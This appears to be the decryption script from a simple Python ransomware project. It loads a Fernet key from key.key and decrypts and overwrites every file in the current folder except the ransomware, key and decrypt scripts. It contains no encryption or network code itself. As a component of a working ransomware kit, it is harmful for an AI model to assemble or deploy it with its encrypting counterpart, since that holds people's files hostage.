from asyncore import write
import os
from cryptography.fernet import Fernet
windowsMainDir = 'C:'

files = []
key = ''
with open("key.key", 'r') as key_arq:
   key = key_arq.read()
for file in os.listdir():
    if file == 'ransomware.py' or file == 'key.key' or file == 'decrypt.py':
        continue
    files.append(file)
for file in files:
    print(file)
    with open(file, 'rb') as write_file:

        content = write_file.read()
        print(content)
    decrypted_content = Fernet(key).decrypt(content)
    with open(file, 'wb') as decrypted:
        decrypted.write(decrypted_content)


